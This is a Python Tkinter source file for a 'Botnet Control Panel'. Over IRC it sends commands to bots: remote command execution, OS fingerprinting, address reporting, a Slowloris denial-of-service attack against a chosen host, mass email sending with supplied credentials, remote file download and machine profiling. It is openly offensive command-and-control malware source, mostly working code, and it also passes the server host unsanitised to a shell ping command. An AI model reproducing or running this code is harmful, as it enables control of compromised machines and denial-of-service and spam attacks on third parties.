from tkinter import Tk, Button, Label, Entry, Text, Toplevel, Checkbutton, BooleanVar, Scale, IntVar, Spinbox
from socket import socket as sock, AF_INET, SOCK_STREAM, error as sock_error, SHUT_RDWR
from tkinter.messagebox import showinfo
from threading import Thread
from time import sleep

root = Tk()
root.wm_title("Botnet Control Panel")
root.configure(background="black")

output_box = Text(root, width=75, height=20, background="black", fg="#00FF00")
output_box.grid(row=1, column=4, rowspan=6)

out_count = 0
def output(o):
    global out_count
    output_box.insert("end", str(out_count) + "| " + o + "\n")
    output_box.see("end")
    out_count += 1

comm_label = Label(root, text="Quasi Dimensional Multi Directional Relativistic Quantum Transvelocidensity", fg="#00FF00", background="black", justify="center")
comm_label.grid(row="0", column=0, columnspan=5)
comm_label.config(font=("System", 20))

server_entry_label = Label(root, text="Server", background="black", fg="red")
server_entry = Entry(root, bd=1, relief="flat", justify="center", background="#333333", fg="white")
server_entry_label.grid(row=1, column=0)
server_entry.grid(row=1, column=1)

port_entry_label = Label(root, text="Port", background="black", fg="red")
port_entry = Entry(root, bd=1, relief="flat", justify="center", background="#333333", fg="white")
port_entry_label.grid(row=2, column=0)
port_entry.grid(row=2, column=1)

username_entry_label = Label(root, text="Nickname", background="black", fg="red")
username_entry = Entry(root, bd=1, relief="flat", justify="center", background="#333333", fg="white")
username_entry_label.grid(row=3, column=0)
username_entry.grid(row=3, column=1)

password_entry_label = Label(root, text="Nickname Password", background="black", fg="red")
password_entry = Entry(root, bd=1, relief="flat", justify="center", show="*", background="#333333", fg="white")
password_entry_label.grid(row=4, column=0)
password_entry.grid(row=4, column=1)

channel_entry_label = Label(root, text="Channel", background="black", fg="red")
channel_entry = Entry(root, bd=1, relief="flat", justify="center", background="#333333", fg="white")
channel_entry_label.grid(row=5, column=0)
channel_entry.grid(row=5, column=1)

chanpass_entry_label = Label(root, text="Channel Password", background="black", fg="red")
chanpass_entry = Entry(root, bd=1, relief="flat", justify="center", show="*", background="#333333", fg="white")
chanpass_entry_label.grid(row=6, column=0)
chanpass_entry.grid(row=6, column=1)

server_entry.insert(0, "irc.freenode.net")
port_entry.insert(0, "6667")
username_entry.insert(0, "tjgerot")
channel_entry.insert(0, "##qdmdrqtvd")

connected = False
die = False
s = None
con_color = "#00FF00"
child = None

def start_connection(host, port, nick, nickpass, channel, chanpass):
    global connected
    global s
    if not connected:
        output("Starting connection")
        try:
            connection_thread = Thread(target=connect, args=(host,port,nick,nickpass,channel,chanpass))
            connect_button.config(background="blue", text="Connecting")
            connection_thread.start()
            connected = True
            return True
            output("Connection started")
        except Exception:
            return False
    else:
        output("Shutting down connection")
        connect_button.config(background="blue", text="Disconnecting")
        die = True
        s.shutdown(SHUT_RDWR)
        s = None
        connected = False
        connect_button.config(background="#00FF00")
        output("Connection killed")
        connect_button.config(background="green", text="Connect")
def connect(host, port, nick, nickpass, channel, chanpass):
    from os import system
    global s
    ready = True
    output("Pinging server to verify connection")
    if not system("ping " + host + " -n 1"):
        server_entry_label.config(fg="#00FF00")
        output("Server is alive and responding")
    else:
        ready = False
        output("Server is not responding to ping request")
    try:
        output("Verifying connection to port")
        s = sock(AF_INET, SOCK_STREAM)
        s.connect((host, port))
        port_entry_label.config(fg="#00FF00")
        output("Port verified as open")
    except sock_error:
        ready = False
    if not ready:
        return False
    registered = False
    joined = False
    finished = False
    idented = False
    reported = False
    while True and die is False:
        data = s.recv(1024)
        parts = data.decode("UTF-8").split("\r\n")
        for part in parts:
            output(part)
            if "PING" in part:
                output("Responding to ping request")
                s.send(("PONG " + part.split()[1] + "\r\n").encode("UTF8"))
            if "nickname is registered" in part:
                username_entry_label.config(fg="#00FF00")
                registered = True
            if "You are now identified" in part or "already logged in" in part:
                password_entry_label.config(fg="#00FF00")
                idented = True
                output("Identified as user " + nick)
            if "End of /NAMES list" in part:
                channel_entry_label.config(fg="#00FF00")
                chanpass_entry_label.config(fg="#00FF00")
                finished = True
        if not registered:
            output("Registering IRC nickname")
            s.send(("NICK " + nick + "\r\n").encode("UTF8"))
            s.send(("USER " + nick + " " + nick + " " + nick + " :" + nick + "\r\n").encode("UTF8"))
            registered = True
            output("Registered with IRC server")
        if not joined:
            output("Joining channel")
            s.send(("JOIN " + channel + " " + chanpass + "\r\n").encode("UTF8"))
            joined = True
            output("Join successful")
        if not idented:
            output("Indentifying to server as " + nick + " with pasword " + ("*" * len(nickpass)))
            s.send(("PRIVMSG NICKSERV :identify " + nick + " " + nickpass + "\r\n").encode("UTF8"))
        if not reported and idented and registered and joined and finished:
            output("Finished connecting")
            connect_button.config(background="red", text="Disconnect")
            con_color = "red"
            # exec_button.config(state="normal")
            # ssh_button.config(state="normal")
            address_button.config(state="normal")
            fingerprint_button.config(state="normal")
            suicide_button.config(state="normal")
            mail_button.config(state="normal")
            loris_button.config(state="normal")
            download_button.config(state="normal")
            reconnect_button.config(state="normal")
            profile_button.config(state="normal")
            # new_button.config(state="normal")
            # new0_button.config(state="normal")
            reported = True

connect_button = Button(root, width=15, height=2, background="green", text="Connect", font=("System", 15), fg="black", bd=0, activebackground=con_color, command=lambda: start_connection(server_entry.get(), int(port_entry.get()), username_entry.get(), password_entry.get(), channel_entry.get(), chanpass_entry.get()))
connect_button.grid(row=7, column=4, sticky="NESW")

def send_command(command):
    global s
    commands = ["Execute", "Brute Force", "Report Address", "Fingerprint OS", "Commit Suicide", "Send Email", "Slow Loris", "Reconnect", "Download File", "Profile Computer", "Scan Host", "Scan Network"]
    output("Preparing to send command '" + commands[command] + "'")
    global child
    child = Toplevel(root)
    verbose = BooleanVar()
    verbose_label = Label(child, text="Verbose")
    verbose_box = Checkbutton(child, variable=verbose)
    if command is 0:
        com_label = Label(child, text="Command to Execute")
        com_label.grid(row=0, column=0)
        com_entry = Entry(child)
        com_entry.grid(row=0, column=1)
        verbose_label.grid(row=1, column=0)
        verbose_box.grid(row=1, column=1)
        submit = Button(child, width=35, text="Begin", command=lambda:s.send(("PRIVMSG " + channel_entry.get() + " :COMMAND EXECUTE <<<" + com_entry.get() + ">>> " + ("VERBOSE" if verbose else "") + "\r\n").encode("UTF8")))
        submit.grid(row=2, column=0, columnspan=2, sticky="NESW")
    elif command is 1:
        pass
    elif command is 2:
        verbose_label.grid(row=0, column=0)
        verbose_box.grid(row=0, column=1)
        submit = Button(child, width=35, text="Begin", command=lambda:s.send(("PRIVMSG " + channel_entry.get() + " :COMMAND ADDRESS " + ("VERBOSE" if verbose else "") + "\r\n").encode("UTF8")))
        submit.grid(row=2, column=0, columnspan=2, sticky="NESW")
    elif command is 3:
        verbose_label.grid(row=0, column=0)
        verbose_box.grid(row=0, column=1)
        submit = Button(child, width=35, text="Begin", command=lambda:s.send(("PRIVMSG " + channel_entry.get() + " :COMMAND FINGERPRINT " + ("VERBOSE" if verbose else "") + "\r\n").encode("UTF8")))
        submit.grid(row=2, column=0, columnspan=2, sticky="NESW")
    elif command is 4:
        verbose_label.grid(row=0, column=0)
        verbose_box.grid(row=0, column=1)
        submit = Button(child, width=35, text="Begin", command=lambda:s.send(("PRIVMSG " + channel_entry.get() + " :COMMAND KILL " + ("VERBOSE" if verbose else "") + "\r\n").encode("UTF8")))
        submit.grid(row=2, column=0, columnspan=2, sticky="NESW")
    elif command is 5:
        sender_label = Label(child, text="Sender Email")
        sender_label.grid(row=0, column=0)
        sender_entry = Entry(child)
        sender_entry.grid(row=0, column=1)
        sender_password_label = Label(child, text="Sender Password")
        sender_password_label.grid(row=1, column=0)
        sender_password_entry = Entry(child, show="*")
        sender_password_entry.grid(row=1, column=1)
        recipient_label = Label(child, text="Recipient Email")
        recipient_label.grid(row=2, column=0)
        recipient_entry = Entry(child)
        recipient_entry.grid(row=2, column=1)
        subject_label = Label(child, text="Email Subject")
        subject_label.grid(row=3, column=0)
        subject_entry = Entry(child)
        subject_entry.grid(row=3, column=1)
        msg_label = Label(child, text="Email Contents", justify="center")
        msg_label.grid(row=4, column=0, columnspan=2, sticky="NESW")
        msg_entry = Text(child)
        msg_entry.grid(row=5, column=0, columnspan=2, sticky="NESW")
        verbose_label.grid(row=6, column=0)
        verbose_box.grid(row=6, column=1)
        submit = Button(child, width=35, text="Begin", command=lambda:s.send(("PRIVMSG " + channel_entry.get() + " :COMMAND EMAIL " + sender_entry.get() + " " + sender_password_entry.get() + " " + recipient_entry.get() + " " + subject_entry.get() + " <<<" + msg_entry.get("1.0", "end") + ">>> " + ("VERBOSE" if verbose else "") + "\r\n").encode("UTF8")))
        submit.grid(row=7, column=0, columnspan=2, sticky="NESW")
    elif command is 6:
        host_label = Label(child, text="Host or Domain")
        host_entry = Entry(child)
        host_label.grid(row=0, column=0)
        host_entry.grid(row=0, column=1)
        loris_port_label = Label(child, text="Port")
        loris_port_spin = Spinbox(child, from_=0, to=65535, width=5)
        loris_port_spin.insert(0, 8)
        loris_port_label.grid(row=1, column=0)
        loris_port_spin.grid(row=1, column=1)
        randua_label = Label(child, text="Random User Agents")
        randua = BooleanVar()
        randua_box = Checkbutton(child, variable=randua)
        randua_label.grid(row=2, column=0)
        randua_box.grid(row=2, column=1)
        https = BooleanVar()
        https_label = Label(child, text="Use HTTPS")
        https_box = Checkbutton(child, variable=https)
        https_label.grid(row=3, column=0)
        https_box.grid(row=3, column=1)
        sock_count = IntVar()
        sockets_label = Label(child, text="Number of sockets")
        sockets_scale = Scale(child, variable=sock_count, orient="horizontal", from_=1, to=500)
        sockets_label.grid(row=4, column=0)
        sockets_scale.grid(row=4, column=1)
        verbose_label.grid(row=5, column=0)
        verbose_box.grid(row=5, column=1)
        submit = Button(child, width=35, text="Begin", command=lambda:s.send(("PRIVMSG " + channel_entry.get() + " :COMMAND SLOWLORIS " + host_entry.get() + " " + str(loris_port_spin.get()) + " " + ("TRUE" if randua else "FALSE") + " " + ("TRUE" if https else "FALSE") + " " + str(sock_count.get()) + " " + ("VERBOSE" if verbose else "") + "\r\n").encode("UTF8")))
        submit.grid(row=6, column=0, columnspan=2, sticky="NESW")
    elif command is 7:
        verbose_label.grid(row=0, column=0)
        verbose_box.grid(row=0, column=1)
        submit = Button(child, width=35, text="Begin", command=lambda:s.send(("PRIVMSG " + channel_entry.get() + " :COMMAND RECONNECT " + ("VERBOSE" if verbose else "") + "\r\n").encode("UTF8")))
        submit.grid(row=1, column=0, columnspan=2, sticky="NESW")
    elif command is 8:
        url_label = Label(child, text="Source URL")
        url_label.grid(row=0, column=0)
        url_entry = Entry(child)
        url_entry.grid(row=0, column=1)
        filename_label = Label(child, text="Filename")
        filename_label.grid(row=1, column=0)
        filename_entry = Entry(child)
        filename_entry.grid(row=1, column=1)
        verbose_label.grid(row=2, column=0)
        verbose_box.grid(row=2, column=1)
        submit = Button(child, width=35, text="Begin", command=lambda:s.send(("PRIVMSG " + channel_entry.get() + " :COMMAND DOWNLOAD " + url_entry.get() + " " + filename_entry.get() + " " + ("VERBOSE" if verbose else "") + "\r\n").encode("UTF8")))
        submit.grid(row=3, column=0, columnspan=2, sticky="NESW")
    elif command is 9:
        verbose_label.grid(row=0, column=0)
        verbose_box.grid(row=0, column=1)
        submit = Button(child, width=35, text="Begin", command=lambda:s.send(("PRIVMSG " + channel_entry.get() + " :COMMAND PROFILE " + ("VERBOSE" if verbose else "") + "\r\n").encode("UTF8")))
    elif command is 10:
        pass
    elif command is 11:
        pass

exec_button = Button(root, text="Execute Command", state="disabled", command=lambda:send_command(0))
exec_button.grid(row=1, column=3, sticky="NESW")
ssh_button = Button(root, text="Brute Force", state="disabled", command=lambda:send_command(1))
ssh_button.grid(row=1, column=2, sticky="NESW")
address_button = Button(root, text="Report Address", state="disabled", command=lambda:send_command(2))
address_button.grid(row=2, column=3, sticky="NESW")
fingerprint_button = Button(root, text="Fingerprint OS", state="disabled", command=lambda:send_command(3))
fingerprint_button.grid(row=2, column=2, sticky="NESW")
suicide_button = Button(root, text="Commit Suicide", state="disabled", command=lambda:send_command(4))
suicide_button.grid(row=3, column=3, sticky="NESW")
mail_button = Button(root, text="Send Email", state="disabled", command=lambda:send_command(5))
mail_button.grid(row=3, column=2, sticky="NESW")
loris_button = Button(root, text="Slow Loris", state="disabled", command=lambda:send_command(6))
loris_button.grid(row=4, column=3, sticky="NESW")
reconnect_button = Button(root, text="Reconnect", state="disabled", command=lambda:send_command(7))
reconnect_button.grid(row=4, column=2, sticky="NESW")
download_button = Button(root, text="Download File", state="disabled", command=lambda:send_command(8))
download_button.grid(row=5, column=3, sticky="NESW")
profile_button = Button(root, text="Profile Computer", state="disabled", command=lambda:send_command(9))
profile_button.grid(row=5, column=2, sticky="NESW")
new_button = Button(root, text="Scan Host", state="disabled", command=lambda:send_command(10))
new_button.grid(row=6, column=3, sticky="NESW")
new0_button = Button(root, text="Scan Network", state="disabled", command=lambda:send_command(11))
new0_button.grid(row=6, column=2, sticky="NESW")

def on_closing():
    global connected
    try:
        connected = True
        start_connection(None, None, None, None, None, None)
    except Exception:
        pass
    root.destroy()
root.protocol("WM_DELETE_WINDOW", on_closing)
root.mainloop()
